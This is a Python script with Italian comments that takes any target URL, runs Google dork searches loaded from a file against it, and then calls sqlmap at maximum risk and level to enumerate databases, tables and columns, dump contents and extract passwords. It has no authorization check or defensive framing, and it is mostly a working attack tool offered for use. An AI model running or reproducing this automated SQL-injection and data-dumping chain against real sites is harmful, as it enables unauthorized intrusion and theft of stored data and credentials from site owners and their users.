import os
import subprocess
import requests
from bs4 import BeautifulSoup
import re

def formatta_numero_telefono(numero_telefono):
    """Formatta il numero di telefono con le parentesi quadre."""
    return f"[{numero_telefono}]"

def run_command(command):
    """Esegui un comando e restituisci l'output."""
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def run_sudo_command(command):
    """Esegui un comando con sudo e restituisci l'output."""
    result = subprocess.run(['sudo'] + command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def print_griglia_risultati(titolo, risultati):
    """Stampa i risultati in una griglia tratteggiata con un titolo."""
    print(f"\n{'-' * 40}\n{titolo}\n{'-' * 40}")
    for risultato in risultati:
        print(risultato)

def esegui_dorks(target_url, dorks):
    """Esegui le Google Dorks su un sito target."""
    print(f"Esecuzione di Google Dorks su {target_url}...\n")
    for dork in dorks:
        url_dork = f"https://www.google.com/search?q={dork}+site:{target_url}"
        try:
            response = requests.get(url_dork)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                links = [a['href'] for a in soup.find_all('a', href=True)]
                print_griglia_risultati(f"Risultati per Dork: {dork}", links)
            else:
                print(f"Errore nella ricerca con Dork {dork}. Status code: {response.status_code}")
        except Exception as e:
            print(f"Errore durante la ricerca con Dork {dork}: {e}")

def carica_dorks(file_path):
    """Carica le Dorks da un file di testo."""
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def perform_sqlmap_scan(target_url):
    """Esegui uno scan SQLmap sul target URL."""
    print("\nEsecuzione scansione SQLmap...\n")
    comandi = [
        ["sqlmap", "-u", target_url, "--batch", "--risk=3", "--level=5", "--dbs"],
        ["sqlmap", "-u", target_url, "--tables"],
        ["sqlmap", "-u", target_url, "--columns"],
        ["sqlmap", "-u", target_url, "--dump"],
        ["sqlmap", "-u", target_url, "--passwords"]
    ]
    for comando in comandi:
        try:
            stdout, stderr = run_command(comando)
            print_griglia_risultati(f"Risultati SQLmap per {comando}", [stdout])
        except Exception as e:
            print(f"Errore durante la scansione SQLmap: {e}")

def check_website_status(url):
    """Controlla se il sito web è accessibile."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Sito {url} accessibile.")
            return True
        else:
            print(f"Sito {url} non accessibile. Status code: {response.status_code}")
            return False
    except requests.RequestException as e:
        print(f"Errore: {e}")
        return False

def main():
    """Funzione principale per eseguire le scansioni."""
    target_url = input("Inserisci l'URL del sito target: ")

    # Controllo se il sito è accessibile
    if check_website_status(target_url):
        # Caricamento delle Dorks
        dorks_file = '/mnt/data/Dork.txt'
        dorks = carica_dorks(dorks_file)
        
        esegui_dorks(target_url, dorks)
        perform_sqlmap_scan(target_url)
    else:
        print("Il sito web non è accessibile. Uscita...")

if __name__ == "__main__":
    main()
